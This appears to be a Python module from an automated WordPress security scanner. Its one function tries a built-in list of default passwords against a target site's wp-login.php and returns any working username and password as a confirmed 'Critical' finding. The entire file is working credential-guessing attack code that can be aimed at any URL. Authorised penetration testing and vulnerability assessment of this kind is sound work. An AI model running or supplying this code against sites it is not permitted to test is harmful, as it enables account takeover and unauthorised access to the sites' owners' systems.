import asyncio
from models import ExploitResult
from utils import normalize_url, http

async def test_weak_credentials(target: str, username: str) -> str:
    """
    Test WordPress login for weak/default passwords.
    
    Args:
        target: Target URL
        username: Username to test
    
    Returns:
        JSON with credential test results
    """
    base = normalize_url(target)
    login_url = f"{base}wp-login.php"
    
    passwords = ['admin', 'password', '123456', 'wordpress', username, 'admin123']
    
    for pwd in passwords:
        try:
            resp = await http.post(login_url, {
                'log': username,
                'pwd': pwd,
                'wp-submit': 'Log In',
                'redirect_to': f"{base}wp-admin/",
            })
            
            # Success indicators
            if 'wp-admin' in str(resp.url) or 'Dashboard' in resp.text:
                return ExploitResult(
                    vulnerable=True,
                    vulnerability_type="Weak Credentials",
                    severity="Critical",
                    confidence="Confirmed",
                    proof_of_concept=f"Username: {username}, Password: {pwd}",
                    extracted_data="Successfully authenticated to wp-admin",
                    remediation="Enforce strong passwords. Implement 2FA immediately.",
                    cvss_score=9.8
                ).model_dump_json(indent=2)
                
        except Exception as e:
            continue
        
        await asyncio.sleep(1)  # Rate limit
    
    return ExploitResult(
        vulnerable=False,
        vulnerability_type="Weak Credentials",
        severity="None",
        confidence="Not Found",
        proof_of_concept="",
        remediation="N/A",
        cvss_score=0.0
    ).model_dump_json(indent=2)
